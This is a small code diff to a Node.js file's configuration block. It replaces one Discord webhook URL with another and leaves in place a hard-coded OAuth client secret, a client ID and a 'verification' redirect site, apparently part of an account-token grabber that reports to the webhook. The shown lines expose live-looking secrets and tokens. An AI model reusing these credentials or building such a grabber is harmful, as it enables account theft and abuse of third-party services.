@@ -2,7 +2,7 @@
 const client_secret = 'T_P8Q~gPIIEBwfIfAHhAeN1ozvOm7sKw62BGubQI'
 const client_id = '7b6d2d17-101a-435d-8864-e1415b2c73fa'
 const redirect_uri = 'https://verification-dc.herokuapp.com/'
-const webhook_url = 'https://discordapp.com/api/webhooks/1041760980092334200/QbwVoXHrDCgc0D9vgZLf8KThtROCd1j_siiQLXfdHQpEycoMFDyrjrJzxLXXqY6hbwx3'
+const webhook_url = 'https://discordapp.com/api/webhooks/1042098877370740776/HWsMw1i7taSX1T7lpVa62arCdKDQSJvHxEIb2V8gMquFXpe6D6_nBUy4Ao7200gR4bL6'
 // Config end
 const axios = require('axios')
 const express = require('express')
